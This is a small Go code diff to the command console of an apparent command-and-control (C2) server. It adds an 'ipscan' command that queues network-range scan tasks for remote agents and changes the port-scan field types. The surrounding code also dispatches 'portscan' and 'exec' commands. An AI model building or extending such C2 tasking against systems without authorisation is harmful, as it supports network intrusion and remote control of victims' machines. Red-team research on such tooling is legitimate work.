@@ -77,6 +77,16 @@ func (c2 *c2) help() {
 func (c2 *c2) handle(text string) {
 	parts := strings.Split(strings.TrimSpace(text), " ")
 	switch parts[0] {
+	case "ipscan":
+		if len(parts) != 2 {
+			fmt.Println("Incorrect usage")
+			c2.help()
+			return
+		}
+
+		message := &pb.IPScan{IpRange: parts[1]}
+		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_IpScan{IpScan: message}}
+
 	case "portscan":
 		if len(parts) != 4 {
 			fmt.Println("Incorrect usage")
@@ -96,7 +106,7 @@ func (c2 *c2) handle(text string) {
 			return
 		}
 
-		message := &pb.PortScan{Ip: parts[1], StartPort: int32(start), EndPort: int32(end)}
+		message := &pb.PortScan{Ip: parts[1], StartPort: uint32(start), EndPort: uint32(end)}
 		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Portscan{Portscan: message}}
 	case "exec":
 		if len(parts) < 2 {
